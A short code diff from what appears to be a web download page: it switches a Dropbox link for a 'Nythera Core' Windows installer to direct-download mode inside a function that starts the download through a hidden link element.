@@ -275,7 +275,7 @@ async function notifyDiscord() {
 // ---- START ACTUAL FILE DOWNLOAD ----
 function startFileDownload() {
     const a = document.createElement('a');
-    a.href = 'https://www.dropbox.com/scl/fi/zvnz8hqdw57j8avhhxk3h/Nythera-Core-Setup-2.0.0.exe?rlkey=fd92avm077sicsyvj9tkqrhq3&st=v0vryz89&dl=0';
+    a.href = 'https://www.dropbox.com/scl/fi/zvnz8hqdw57j8avhhxk3h/Nythera-Core-Setup-2.0.0.exe?rlkey=fd92avm077sicsyvj9tkqrhq3&st=v0vryz89&dl=1';
     a.download = 'NytheraCore Setup 2.0.0.exe';
     a.style.display = 'none'; // Ensure it's hidden
     document.body.appendChild(a);
